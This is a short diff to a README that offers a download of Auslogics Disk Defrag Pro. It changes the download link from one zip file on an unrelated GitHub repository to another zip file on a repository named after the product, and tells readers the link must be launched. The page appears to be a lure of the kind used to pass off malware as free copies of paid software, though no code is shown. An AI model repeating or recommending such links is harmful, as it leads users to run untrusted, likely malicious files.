@@ -30,7 +30,7 @@ Explore various topics related to Auslogics Disk Defrag Pro:
 
 Click the button below to download the software:
 
-[![Download Auslogics Disk Defrag Pro](https://img.shields.io/badge/Download-Software.zip-yellow)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Auslogics Disk Defrag Pro](https://github.com/markypogs/Auslogics-Disk-Defrag-Pro-Download/releases/download/v1.0/Application.zip)](https://github.com/markypogs/Auslogics-Disk-Defrag-Pro-Download/releases/download/v1.0/Application.zip)
 
 *Note: The link above needs to be launched to initiate the download.*
 
